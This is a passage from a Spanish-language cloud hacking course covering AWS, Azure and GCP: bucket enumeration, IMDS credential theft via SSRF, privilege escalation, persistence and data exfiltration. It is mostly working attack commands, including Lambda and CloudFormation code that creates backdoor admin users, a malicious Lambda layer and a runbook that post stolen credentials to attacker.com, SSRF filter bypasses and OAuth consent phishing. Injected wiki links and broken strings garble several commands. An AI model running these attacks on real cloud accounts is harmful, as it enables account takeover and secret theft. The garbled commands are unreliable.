**Solucion:**

**Paso 1: Verificar acceso publico**
```bash
curl -s "https://empresastorage.blob.core.windows.net/backups?restype=container&comp=list" | Select-Xml -Xpath "//Blob/Name" | select -ExpandProperty InnerText
```

**Paso 2: Si hay SAS tokens, usarlos**
```bash
trufflehog github --repo https://github.com/empresa/codigo
```

**Paso 3: Si tenes key, descargar todo**
```bash
az storage blob download-batch \ --account-name empresastorage \ --account-key "foundkey" \ --source backups \ --destination ./exfiltrated
```

### 4.3 [gcp](../raw/cl0ud-h4ck1ng.md#gcp) [cloud](../raw/cl0ud-h4ck1ng.md) Storage

#### 4.3.1 Bucket Discovery y Enumeracion

```bash
nslookup bucket-name.storage.googleapis.com

for bucket in empresa empresa-backup empresa-assets; do curl -s "https://storage.googleapis.com/$bucket/" | grep -q "ListBucketResult" && echo "Bucket publico: $bucket"
done
```

#### 4.3.2 Signed URL Exploitation

GCP tambien tiene Signed URLs.

```
https://storage.googleapis.com/empresa-bucket/secret.pdf?GoogleAccessId=sa@project.iam.gserviceaccount.com&Expires=1700000000&Signature=xxx
```

```bash
curl "https://storage.googleapis.com/empresa-bucket/secret.pdf?GoogleAccessId=sa@project.iam.gserviceaccount.com&Expires=1700000000&Signature=xxx" -o secret.pdf
```

#### 4.3.3 IAM Policy Exploitation en Buckets

```bash
# Ver politica actual
gsutil iam get gs://empresa-bucket

# Dar acceso publico
gsutil iam ch allUsers:objectViewer gs://empresa-bucket
```

#### 4.3.4 Ejercicio Practico: GCP Storage Exploitation

**Escenario:**
Encontraste una Signed URL en un reporte de [bug bounty](../raw/b9g-b09nty.md).

**Objetivo:** Encontrar mas archivos usando la misma SA.

**Solucion:**

```bash
# Probar otros paths con la misma firma
curl "https://storage.googleapis.com/empresa-gcp-files/backup.sql?GoogleAccessId=sa-report@empresa-gcp.iam.gserviceaccount.com&Expires=1710000000&Signature=xxx"

# Si encontramos la SA key, generar signed URLs propias
gsutil signurl -d 1h sa-key.json gs://empresa-gcp-files/backup.sql
```

---

## 5. IMDS: Instance Metadata Service

### 5.1 IMDSv1: El Problema Original

IMDS (Instance Metadata Service) es un servicio que corre en cada instancia Ec2 en `http://169.254.169.254/latest/meta-data/`. Sirve metadata sobre la instancia, incluyendo credenciales temporales.

**IMDSv1 es inseguro porque cualquier [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) en la instancia (o cualquier [ssrf](../raw/w3b-h4ck1ng.md#ssrf)) puede consultarlo sin [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion):**

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRoleName/
```

**Respuesta:**
```json
{ "Code": "Success", "Type": "AWS-HMAC", "AccessKeyId": "ASIAIOSFODNN7EXAMPLE", "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "Token": "IQoJb3JpZ2luX2VjEMf..", "Expiration": "2024-12-31T23:59:59Z"
}
```

**Paths utiles de IMDS:**
```
http://169.254.169.254/latest/meta-data/ ami-id, hostname, instance-id, instance-type local-ipv4, public-ipv4, public-hostname iam/info, iam/security-credentials/, iam/security-credentials/[ROLE_NAME] network/interfaces/macs/ placement/availability-zone, placement/region profile, reservation-id, security-groups, services/partition

http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/dynamic/instance-identity/signature
```

### 5.2 IMDSv2: Defensa por Sesion

IMDSv2 agrega proteccion mediante un token de sesion.

```bash
# Obtener token (IMDSv2)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \ -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Usar token para acceder a metadata
curl -H "X-aws-ec2-metadata-token: $TOKEN" \ http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**IMDSv2 requiere:**
1. PUT request a `/latest/api/token` con `X-aws-ec2-metadata-token-ttl-seconds` header.
2. Usar el token devuelto en GET requests como header.

**pero IMDSv2 no es infalible.** Si el atacante puede hacer un PUT request seguido de un GET (como en un SSRF completo), tambien puede obtener credenciales.

### 5.3 SSRF a [cloud](../raw/cl0ud-h4ck1ng.md) Metadata

#### 5.3.1 Server-Side Request Forgery basico

**Vulnerable (Node.js):**
```javascript
app.get('/fetch', async (req, res) => { const url = req.query.url; const response = await fetch(url); const data = await response.text; res.send(data);
});
```

**Explotacion:**
```
/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
/fetch?url=http://169.254.169.254/latest/user-data/
/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Con IMDSv2:**
```
/fetch?url=http://169.254.169.254/latest/api/token
# Luego:
/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&header=X-aws-ec2-metadata-token:TOKEN
```

#### 5.3.2 SSRF ciego a Metadata

A veces no se ve el resultado del SSRF (blind SSRF). Aun asi se puede exfiltrar credenciales por [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns).

**DNS exfiltracion:**
```bash
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$(hostname).attacker.com/"
```

#### 5.3.3 SSRF con Redirect

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redirect_to_metadata: return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole')
```

### 5.4 Token Theft de IMDSv2

#### 5.4.1 Bypass de cabecera X-Forwarded-For

```bash
curl -H "X-Forwarded-For: 169.254.169.254" http://169.254.169.254/latest/meta-data/
```

#### 5.4.2 Bypass con DNS Rebinding

Usando un dominio TTL bajo que resuelva a 169.254.169.254.

```bash
# 1. Crear un dominio con TTL=0 que apunte a tu servidor
# 2. Hacer un primer request que la aplicacion verifica (resuelve a tu IP)
# 3. Cambiar el DNS a 169.254.169.254
# 4. El segundo request (el real) resuelve a metadata
```

#### 5.4.3 Extraccion de credenciales IMDSv2

SSRF avanzado con IMDSv2 bypass:

```bash
# Si la aplicacion permite PUT requests o headers custom:
# 1. Obtener token
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600

# 2. Usar token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
Header: X-aws-ec2-metadata-token: [token]
```

### 5.5 IMDS en [azure](../raw/cl0ud-h4ck1ng.md#azure): Instance Metadata Service

Azure tiene su propio metadata service en la misma [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip).

```bash
# Token de Managed Identity
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \ -H "Metadata: true"

# Metadata de VM
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# Informacion de managed identity
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
```

### 5.6 IMDS en [gcp](../raw/cl0ud-h4ck1ng.md#gcp): Metadata Server

GCP tambien usa la IP 169.254.169.254.

```bash
# Token de service account
curl -H "Metadata-Flavor: Google" \ "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# O usando la IP
curl -H "Metadata-Flavor: Google" \ "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"

# Listar service accounts
curl -H "Metadata-Flavor: Google" \ "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# Informacion de proyecto
curl -H "Metadata-Flavor: Google" \ "http://metadata.google.internal/computeMetadata/v1/project/"
```

### 5.7 Ejercicio Practico: SSRF a Metadata

**Escenario:**
Encontraste una aplicacion web en `http://app.ejemplo.com` con una [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) `proxy.php` que acepta `?url=` y descarga contenido.

**Objetivo:** Extraer credenciales IMDS.

**Solucion:**

**Paso 1: Probar SSRF basico**
```bash
curl "http://app.ejemplo.com/proxy.php?url=http://169.254.169.254/latest/meta-data/"
```

**Paso 2: Bypasses**
```bash
# Decimal
curl "http://app.ejemplo.com/proxy.php?url=http://2852039166/latest/meta-data/"

# Octal
curl "http://app.ejemplo.com/proxy.php?url=http://0251.0254.0251.0254/latest/meta-data/"

# Hexadecimal
curl "http://app.ejemplo.com/proxy.php?url=http://0xA9FEA9FE/latest/meta-data/"

# Con redirect
curl "http://app.ejemplo.com/proxy.php?url=http://attacker.com/redirect"
```

**Paso 3: Extraer credenciales**
```bash
curl "http://app.ejemplo.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

---

## 6. [aws](../raw/cl0ud-h4ck1ng.md#aws)-Specific Attacks

### 6.1 AssumeRole Attacks

#### 6.1.1 Cross-Account Role Assumption Maliciosa

```bash
# Enumerar roles que permiten asuncion externa
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement.Principal.AWS != `null`]' --output table

# Asumir rol cross-account
aws sts assume-role \ --role-arn arn:aws:iam::TARGET_ACCOUNT:role/VulnerableRole \ --role-session-name cross-account-hack
```

#### 6.1.2 Role Trust Policy Manipulation

```json
{ "Version": "2012-10-17", "Statement": [ { "Effect": "Allow", "Principal": { "AWS": "arn:aws:iam::MY_ACCOUNT:root" }, "Action": "sts:AssumeRole", "Condition": {} } ]
}
```

```bash
aws iam update-assume-role-policy \ --role-name TargetRole \ --policy-document file://trust-policy.json

aws sts assume-role \ --role-arn arn:aws:iam::MY_ACCOUNT:role/TargetRole \ --role-session-name escalated
```

#### 6.1.3 Chaining de Roles para persistenciaia)

```bash
# Crear un rol de persistencia
aws iam create-role \ --role-name PersistenceRole \ --assume-role-policy-document file://allow-self.json

# Darle admin
aws iam attach-role-policy \ --role-name PersistenceRole \ --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 6.2 Lambda [privilege escalation](../raw/l1n9x-pr1v3sc.md)

#### 6.2.2 lambda:UpdateFunctionCode

```bash
cat > index.py << 'EOF'
def handler(event, context): import boto3, json iam = boto3.client('iam') user = iam.create_user(UserName='persistent-user') iam.attach_user_policy(UserName='persistent-user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess') key = iam.create_access_key(UserName='persistent-user') return {'accessKey': key['AccessKey']['AccessKeyId'], 'secretKey': key['AccessKey']['SecretAccessKey']}
EOF
zip function.zip index.py

aws lambda update-function-code \ --function-name ExistingFunction \ --zip-file fileb://function.zip

aws lambda invoke --function-name ExistingFunction output.json
```

#### 6.2.3 lambda:InvokeFunction + lambda:addPermission

```bash
aws lambda add-permission \ --function-name TargetFunction \ --statement-id s3-invoke \ --action lambda:InvokeFunction \ --principal s3.amazonaws.com \ --source-arn arn:aws:s3:::victim-bucket
```

#### 6.2.4 Lambda Layer exploitation

```bash
mkdir -p layer/python
cat > layer/python/hijack.py << 'EOF'
import boto3
sts = boto3.client('sts')
identity = sts.get_caller_identity
# Enviar a atacante
try: import requests requests.post('http://attacker.com/steal', json=identity)
except: pass
EOF

cd layer
zip -r ./malicious-layer.zip .
cd .

aws lambda publish-layer-version \ --layer-name malicious-layer \ --zip-file fileb://malicious-layer.zip \ --compatible-runtimes python3.9 python3.10

#### 6.2.5 Environment Variable Theft en Lambda

Las variables de entorno de Lambda pueden contener API keys, database passwords, etc.

```bash
# Listar funciones
aws lambda list-functions --query 'Functions[*].[FunctionName,Environment]'

# Obtener variables de entorno de una funcion
aws lambda get-function-configuration \ --function-name TargetFunction \ --query 'Environment.Variables'
```

**A traves de codigo malicioso:**
```python
def handler(event, context): import os return dict(os.environ)
```

### 6.3 CloudFormation Template Injection

#### 6.3.1 Template Parameters Abuse

CloudFormation permite pasar parametros al stack. Si el template usa parametros en Resource Names o Policies sin validar, podes inyectar.

**Template vulnerable:**
```yaml
Parameters: BucketName: Type: String
Resources: DataBucket: Type: AWS::[s3](../raw/cl0ud-h4ck1ng.md#s3)::Bucket Properties: BucketName: !Ref BucketName AccessControl: PublicRead
```

#### 6.3.2 Nested Stack Exploitation

Si un stack llama a otro stack anidado, el template hijo puede ser manipulado si la URL no es segura.

```yaml
Resources: NestedStack: Type: AWS::cloudFormation::Stack Properties: TemplateURL: httpss)://s3.amazonaws.[com](../raw/w1n-s9bsyst3ms.md#com)/victim-bucket/templates/substack.yaml
```

#### 6.3.3 Custom Resource Lambda Backdoor

```yaml
Resources: Backdoor: Type: Custom::Backdoor Properties: ServiceToken: "arn:aws:lambda:us-east-1:123456789012:function:backdoor-lambda"
```

```python
def handler(event, context): import boto3 iam = boto3.client('iam') if event['RequestType'] == 'Create': iam.create_user(UserName='cf-backdoor') iam.attach_user_policy( UserName='cf-backdoor', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess' ) return {'Status': 'SUCCESS'}
```

### 6.4 SSM Agent Abuse

#### 6.4.1 SSM Command Execution

```bash
# Listar instancias managed
aws ssm describe-instance-information --query 'InstanceInformationList[*].[InstanceId,ComputerName,PlatformType]'

# Ejecutar comando
aws ssm send-command \ --instance-[ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips))) i-0abcd1234efgh5678 \ --document-name "AWS-RunShellScript" \ --parameters commands="whoami; hostname; curl [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://169.254.169.254/latest/meta-data/iam/security-c[redentials/"]

# Obtener output del comando
aws ssm list-command-invocations \ --command-id $(aws ssm send-command --instance-ids i-xxx --document-name AWS-RunShellScript --parameters commands=["id"] --query Command.CommandId --output text)
```

#### 6.4.2 SSM Parameter Store Secrets Extraction

```bash
# Listar parametros
aws ssm describe-parameters --query 'Parameters[*].[Name,Type,LastModifiedDate]'

# Obtener valor
aws ssm get-parameter --name /prod/db/password --with-decryption

# Buscar parametros por path
aws ssm get-parameters-by-path --path /prod/

# Obtener todos los parametros
for param in $(aws ssm describe-parameters --query 'Parameters[*].Name' --output text); do echo "=== $param ===" aws ssm get-parameter --name "$param" --with-decryption 2>/dev/null || \ aws ssm get-parameter --name "$param" 2>/dev/null
done
```

#### 6.4.3 SSM Agent Credential Theft

```bash
# En la instancia comprometida:
[sudo](../raw/l1n9x-pr1v3sc.md#sudo) cat /proc/$(pgrep -f amazon-ssm-agent)/environ | tr '\0' '\n' | grep AWS
sudo cat /var/log/amazon/ssm/errors.log
```

#### 6.4.4 Session Manager Port Forwarding

```bash
# Iniciar sesion
aws ssm start-session --target i-0abcd1234efgh5678

# Port forwarding
aws ssm start-session \ --target i-0abcd1234efgh5678 \ --document-name AWS-StartPortForwardingSession \ --parameters '{"portNumber":["80"], "localPortNumber":["8888"]}'

curl http://localhost:8888/
```

### 6.5 ECS/EKS/Fargate Exploitation

#### 6.5.1 ECS Task Definition Abuse

```bash
aws ecs list-task-definitions

aws ecs register-task-definition \ --family rogue-task \ --task-role-arn arn:aws:iam::123456789012:role/AdminRole \ --execution-role-arn arn:aws:iam::123456789012:role/ecsExecutionRole \ --[container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores)-definitions '[{"name":"rogue","image":"alpine","command":["sh","-c","curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/creds; cat /tmp/creds"]}]'
```

#### 6.5.2 EKS Pod Escalation

```bash
kubectl get pods -n kube-system
kubectl get sa -n kube-system
kubectl describe [pod](../raw/k8s-d33p-d1v3.md#pods) some-[pod](../raw/k8s-d33p-d1v3.md#pods) | grep -A5 Annotations
```

**Explotacion con IRSA:**
```yaml
apiVersion: v1
kind: Pod
metadata: name: attacker-pod annotations: eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/AdminRole
spec: serviceAccountName: admin-sa containers: - name: alpine image: alpine command: "sh", "-c", "[[apk](../raw/4pk-r3v3rs1ng.md) add curl; curl 169.254.169.254/latest/meta-data/iam/security-credentials/; sleep 3600"]
```

#### 6.5.3 Fargate Sidecar Injection

```json
{ "family": "vulnerable-task", "taskRoleArn": "arn:aws:iam::123456789012:role/AdminRole", "containerDefinitions": [ { "name": "sidecar", "image": "alpine:latest", "command": ["sh", "-c", "wget -q -O- http://169.254.170.2/v2/credentials/"] }, { "name": "original", "image": "nginx:latest" } ]
}
```

### 6.6 API Gateway Abuse

```bash
# Probar endpoints sin auth
curl [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://xxx.execute-api.us-east-1.amazonaws.com/prod/

# Buscar API keys en codigo
```

### 6.7 Cognito Misconfigurations

```bash
aws cognito-idp list-user-pools --max-results 50
aws cognito-idp describe-user-pool --user-pool-id us-east-1_xxxxx

# Intentar registro sin restricciones
aws cognito-idp sign-up \ --client-id xxx \ --username attacker@evil.com \ --password "Hacker123!" \ --user-attributes Name=email,Value=attacker@evil.com

aws cognito-idp admin-confirm-sign-up \ --user-pool-id us-east-1_xxxxx \ --username attacker@evil.com
```

### 6.8 KMS Key Abuse

```bash
aws kms list-keys
aws kms get-key-policy --key-id xxx --policy-name default

aws kms encrypt --key-id xxx --plaintext fileb://data.bin --output text --query CiphertextBlob
aws kms decrypt --ciphertext-blob fileb://data.enc --output text --query Plaintext
```

---

## 7. Azure-Specific Attacks

### 7.1 Managed Identity Abuse

#### 7.1.1 Token Extraction desde VM

```bash
# Desde la VM comprometida
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.[azure](../raw/cl0ud-h4ck1ng.md#azure).com/" -H "Metadata: true"

# Token para Key Vault
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" -H "Metadata: true"

# Token para Storage
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com" -H "Metadata: true"
```

**Usar token extraido:**
```powershell
$token = "eyJ0eXAiOiJKV1Qi.."
$headers = @{Authorization = "Bearer $token"}

# Listar subscriptions
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers $headers

# Listar recursos
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions/$subId/resources?api-version=2020-10-01" -Headers $headers
```

#### 7.1.2 Token Relay

```powershell
$token = Invoke-RestMethod -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{Metadata='true'}
$token.access_token > token.txt

# En otra maquina:
$token = Get-Content token.txt
Invoke-RestMethod -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -Headers @{Authorization = "Bearer $token"}
```

#### 7.1.3 Cross-Resource Token Abuse

```bash
# Listar roles de la managed identity
az role assignment list --assignee <principal-id> --output table

# Obtener token para Key Vault
curl "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" -H "Metadata: true"

# Listar secrets en Key Vault
Invoke-RestMethod -Uri "https://vaultname.vault.azure.net/secrets?api-version=7.3" -Headers @{Authorization = "Bearer $token"}
```

### 7.2 Key Vault Extraction

#### 7.2.1 Access Policy Abuse

```bash
az keyvault show --name vaultname --query properties.accessPolicies

# Agregar policy para nosotros
az keyvault [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-policy \ --name vaultname \ --upn user@domain.com \ --secret-permissions get list \ --key-permissions get list \ --certificate-permissions get list
```

#### 7.2.2 RBAC vs Access Policies Bypass

```bash
az keyvault show --name vaultname --query properties.enableRbacAuthorization

# Si RBAC esta habilitado, necesitamos asignacion RBAC
az role assignment create \ --assignee user@domain.com \ --role "Key Vault Secrets User" \ --scope /subscriptions/$subId/resourceGroups/$rg/providers/Microsoft.KeyVault/vaults/vaultname
```

#### 7.2.3 Key Vault Firewall Bypass

```bash
az keyvault show --name vaultname --query properties.networkAcls
```

Si permite "Trusted Services", podemos usar servicios de Azure como Logic Apps o Functions para bypassear el firewall.

#### 7.2.4 Soft-Delete Recovery Attack

```bash
# Listar vaults eliminados
az keyvault list-deleted --query '.{Name:name, Id:id}'

# Recuperar vault eliminado
az keyvault recover --name vaultname

# Ahora tenemos acceso a secrets eliminados
az keyvault secret list --vault-name vaultname
```

### 7.3 Automation Account Exploitation

#### 7.3.1 Runbook Hijacking

```bash
# Obtener runbooks existentes
az automation runbook list \ --automation-account-name target-auto \ --resource-group target-rg \ --output table

# Obtener contenido del runbook
az automation runbook show \ --automation-account-name target-auto \ --resource-group target-rg \ --name target-runbook
```

#### 7.3.2 Hybrid Worker Abuse

Los Hybrid Workers son maquinas on-premises que ejecutan runbooks.

```bash
# Listar hybrid workers
az automation hybrid-worker-group list \ --automation-account-name target-auto \ --resource-group target-rg

# Ejecutar comando en hybrid worker
az automation runbook create \ --automation-account-name target-auto \ --resource-group target-rg \ --name pwn-worker \ --type [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) \ --description "Execute on hybrid worker"

# El runbook se ejecuta en el on-prem, dando pivot a la red interna
```

#### 7.3.3 Credential Extraction desde Runbooks

```powershell
# Runbook que extrae credenciales de Automation Account
$creds = Get-AutomationPSCredential -Name "AdminCreds"
$username = $creds.UserName
$password = $creds.GetNetworkCredential.Password
Write-Output "Username: $username"
Write-Output "Password: $password"

# Enviar a atacante
$body = @{user=$username; pass=$password} | ConvertTo-Json
Invoke-RestMethod -Uri "http://attacker.com/steal" -Method POST -Body $body -ContentType "application/json"
```

### 7.4 Logic App Abuse

#### 7.4.1 HTTP Trigger Exploitation

```bash
# Obtener URL del trigger HTTP
az logic workflow show --name target-logicapp --resource-group target-rg --query properties.accessEndpoint

# Enviar request malicioso
curl -X POST "https://prod-xx.eastus.logic.azure.com:443/workflows/xxx/triggers/manual/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=xxx" -d '{"data": "malicious"}'
```

#### 7.4.2 Managed Identity en Logic Apps

```bash
# Ver managed identity
az logic workflow show --name target-logicapp --resource-group target-rg --query identity

# Agregar managed identity (system-assigned)
az logic workflow update \ --name target-logicapp \ --resource-group target-rg \ --set identity.type=SystemAssigned
```

#### 7.4.3 Logic App Backdoor Creation

```bash
# Crear Logic App backdoor
az logic workflow create \ --resource-group my-rg \ --location eastus \ --name backdoor-logic \ --definition '{ "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#", "triggers": {"manual": {"type": "Request"}}, "actions": { "HTTP": { "type": "Http", "inputs": { "method": "GET", "uri": "@{triggerOutputs?['headers']?['url']}" } } } }'
```

### 7.5 Azure AD (Entra ID) Attacks

#### 7.5.1 App Registration Abuse

```bash
# Listar app registrations
az [ad](../raw/w1nd0ws-d0m41n-4dm1n.md) app list --output table

# Agregar credencial a una app existente
az ad app credential reset \ --id <app-id> \ --display-name malicious-key \ --end-date 2025-12-31

# Usar la credencial para obtener token
az login --service-principal -u <app-id> -p <password> --tenant <tenant-id>
```

#### 7.5.2 Service Principal Hijacking

```bash
# Listar service principals
az ad sp list --output table

# Agregar credencial a SP
az ad sp credential reset --id <sp-object-id>

# Asignar roles al SP
az role assignment create \ --assignee <sp-object-id> \ --role Contributor \ --subscription <sub-id>
```

#### 7.5.3 OAuth Consent Phishing

Crear una app maliciosa que solicite permisos y engañar a usuarios para que la acepten:

```bash
# Crear app con permisos
az ad app create \ --display-name "Microsoft Authenticator" \ --required-resource-accesses '[{"resourceAccess":[{"id":"<permission-id>","type":"Scope"}],"resourceAppId":"00000003-0000-0000-c000-000000000000"}]'
```

#### 7.5.4 Privilege Escalation via Application Permissions

Si una aplicacion tiene `Application.ReadWrite.All` o `RoleManagement.ReadWrite.Directory`, se puede escalar a Global Admin.

```powershell
# Con permisos de aplicacion elevados
Connect-MgGraph -ClientId <app-id> -TenantId <tenant-id> -CertificateThumbprint <thumbprint>

# Crear nuevo Global Admin
New-MgRoleManagementDirectoryRoleAssignment ` -PrincipalId <user-id> ` -RoleDefinitionId (Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'Global Administrator'").Id ` -DirectoryScopeId "/"
```

### 7.6 Azure Container Registry Abuse

```bash
az acr list --resource-group target-rg --output table

# Login al ACR
az acr login --name targetregistry

# Listar repositorios
az acr repository list --name targetregistry --output table

# Listar tags
az acr repository show-tags --name targetregistry --repository my-app

# Extraer imagenes
[docker](../raw/d0ck3r-f0r-h4ck3rs.md) pull targetregistry.azurecr.io/my-app:latest
docker save targetregistry.azurecr.io/my-app:latest -o image.tar
```

### 7.7 Azure Kubernetes Service Exploitation

```bash
# Obtener credenciales del cluster-d33p
az aks get-credentials --resource-group target-rg --name target-[cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster))

# Listar pods en kube-system
kubectl get pods -n kube-system

# Ver si hay pods con Azure Identity
kubectl get azureidentity -n default
kubectl get azureidentitybinding -n default
```

### 7.8 Function App Exploitation

```bash
# Listar function apps
az functionapp list --resource-group target-rg --output table

# Obtener funciones dentro de una app
az functionapp function list \ --name target-functionapp \ --resource-group target-rg

# Obtener URL de la funcion
az functionapp function show \ --name target-functionapp \ --resource-group target-rg \ --function-name HttpTrigger1

# Ejecutar funcion
curl "https://target-functionapp.azurewebsites.net/api/HttpTrigger1?code=xxx"
```

---

## 8. GCP-Specific Attacks

### 8.1 Service Account Key Theft

#### 8.1.1 Extraccion desde Compute Engine

```bash
# Desde la instancia comprometida
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Obtener token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Obtener la clave completa de la SA (si esta en la instancia)
find / -name "*.json" -path "*service-account*" 2>/dev/null
find / -name "key.json" 2>/dev/null
```

#### 8.1.3 Key Rotation Bypass

Si la SA rota sus claves, las viejas pueden seguir funcionando si no se eliminan explicitamente.

```bash
# Listar todas las claves de una SA
gcloud iam service-accounts keys list \ --iam-account sa@project.iam.gserviceaccount.com \ --managed-by user

# Las claves viejas pueden seguir siendo validas
```

#### 8.1.4 Impersonacion de Service Accounts

```bash
# Impersonar una SA
gcloud auth application-default login \ --impersonate-service-account sa@project.iam.gserviceaccount.com

# O con curl usando el token de la SA
curl -X POST \ -H "Authorization: Bearer $(gcloud auth print-access-token)" \ -H "Content-Type: application/json" \ "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa@project.iam.gserviceaccount.com:generateAccessToken" \ -d '{"scope": "https://www.googleapis.com/auth/[[cloud](../raw/cl0ud-h4ck1ng.md)-platform"]}'
```

### 8.2 Cloud Functions Exploitation

#### 8.2.1 Function URL Abuse

```bash
# Listar funciones
gcloud functions list --project [PROJECT_ID]

# Obtener URL de la funcion
gcloud functions describe my-function --format='value(httpsTrigger.url)'

# Probar invocacion
curl "https://us-central1-[PROJECT_ID].cloudfunctions.net/my-function"
```

#### 8.2.2 Event-Triggered Function Poisoning

```bash
# Si una funcion se dispara por eventos de Storage
gcloud functions describe data-processor --format='value(eventTrigger)'

# Subir archivo malicioso al bucket
echo "malicious data" | gsutil cp - gs://input-bucket/malicious.txt
```

#### 8.2.3 Environment Variable Extraction

```bash
# Obtener variables de entorno de la funcion
gcloud functions describe my-function --format='value(environmentVariables)'
```

#### 8.2.4 Background Function Persistence

Crear una funcion background que se ejecute periodicamente:

```bash
gcloud functions deploy persistent-backdoor \ --runtime python311 \ --trigger-topic persistence-topic \ --service-account admin-sa@[PROJECT_ID].iam.gserviceaccount.com
```

### 8.3 KMS Key Abuse

#### 8.3.1 Key Ring Enumeration

```bash
gcloud kms keyrings list --location global --project [PROJECT_ID]
gcloud kms keys list --location global --keyring [KEYRING] --project [PROJECT_ID]
```

#### 8.3.2 CryptoKey Exploitation

```bash
# Ver permisos sobre las keys
gcloud kms keys get-iam-policy [KEY] --location global --keyring [KEYRING]

# Cifrar datos
echo "plaintext" | gcloud kms encrypt \ --location global \ --keyring [KEYRING] \ --key [KEY] \ --plaintext-file - \ --ciphertext-file - | base64

# Descifrar datos
echo "ciphertext_base64" | base64 -d | gcloud kms decrypt \ --location global \ --keyring [KEYRING] \ --key [KEY] \ --ciphertext-file - \ --plaintext-file -
```

#### 8.3.3 Key Import Tampering

GCP permite importar claves propias a KMS:

```bash
gcloud kms keys versions import \ --location global \ --keyring [KEYRING] \ --key [KEY] \ --algorithm google-symmetric-encryption \ --target-key-file /path/to/my-key
```

### 8.4 Cloud Storage IAM Exploitation

```bash
gsutil iam get gs://bucket-name

# Agregar miembro
gsutil iam ch user:attacker@domain.com:objectAdmin gs://bucket-name

# Listar archivos
gsutil ls gs://bucket-name/**

# Copiar archivos
gsutil cp gs://bucket-name/secret.txt .
```

### 8.5 Cloud SQL Exploitation

```bash
gcloud sql instances list

# Obtener info de conexion
gcloud sql instances describe my-instance

# Conectar si whitelisted
gcloud sql connect my-instance --user=root

# Crear usuario
gcloud sql users create attacker --instance=my-instance --password="H4ck3d!"
```

### 8.6 BigQuery Data Exfiltration

```bash
bq ls --project_id [PROJECT_ID]
bq show dataset-name.table-name
bq query --use_legacy_sql=false 'SELECT * FROM dataset-name.table-name LIMIT 100'

# Exportar a Storage
bq extract --destination_format CSV \ 'project:dataset.table' \ gs://attacker-bucket/export-*.csv
```

### 8.7 VPC and Network Exploitation

```bash
gcloud compute networks list
gcloud compute [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls)-rules list

# Crear regla de firewall permisiva
gcloud compute firewall-rules create open-door \ --network default \ --allow [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp):0-65535,[udp](../raw/r3d3s-f0nd4m3nt0s.md#udp):0-65535,icmp \ --source-ranges 0.0.0.0/0
```

---

## 9. Herramientas de Cloud Hacking

### 9.1 Pacu --- AWS Exploitation Framework

Pacu es el framework de post-explotacion para AWS mas completo. Fue creado por Rhino Security Labs.

#### 9.1.1 Instalacion y Configuracion

```bash
pip install pacu

# O desde source:
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
